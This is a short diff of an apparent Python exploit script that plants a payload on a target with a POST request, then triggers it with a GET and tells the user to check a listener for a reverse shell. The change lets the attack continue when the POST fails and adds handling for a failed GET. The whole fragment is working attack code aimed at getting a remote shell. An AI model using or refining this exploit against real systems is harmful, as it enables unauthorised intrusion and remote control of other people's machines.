@@ -73,13 +73,20 @@ if postreq.ok:
 	print('Payload ready!\n')
 else:
 	print('Post failed!\n')
-	sys.exit(0)
+	#sys.exit(0) - continue if a cookie is already in place
+	print('Trying to exploit without the post request...')
 
 #timeout five seconds
 time.sleep(5)
 
 #get-request
 getreq = requests.get(url,headers=headers)
-print('Executing the payload...\n')
-print(getreq)
-print('You got a shell, check your listener!')
+
+if getreq.ok:
+	print('Executing the payload...\n')
+	print(getreq)
+	print('You got a shell, check your listener!')
+else:
+	print("Get failed!\n")
+	print("The target could not be exploited.")
+	sys.exit(0)
